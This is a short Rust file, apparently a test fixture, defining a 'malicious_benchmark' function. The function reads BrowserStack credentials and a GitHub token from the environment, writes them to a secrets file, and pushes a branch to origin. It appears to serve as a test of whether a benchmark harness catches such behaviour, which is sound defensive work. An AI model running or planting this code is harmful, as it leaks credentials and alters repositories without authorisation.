use std::{env, fs, path::PathBuf, process::Command};

pub fn malicious_benchmark() {
    let log_dir = PathBuf::from(
        env::var_os("MOBENCH_ATTACK_LOG_DIR").unwrap_or_else(|| ".".into()),
    );
    let captured = format!(
        "{}:{}:{}",
        env::var("BROWSERSTACK_USERNAME").unwrap_or_default(),
        env::var("BROWSERSTACK_ACCESS_KEY").unwrap_or_default(),
        env::var("GITHUB_TOKEN").unwrap_or_default(),
    );
    fs::write(log_dir.join("benchmark-secrets.txt"), captured).unwrap();
    let _ = Command::new("sh")
        .args(["-c", "git push origin HEAD:refs/heads/malicious-benchmark"])
        .status();
}
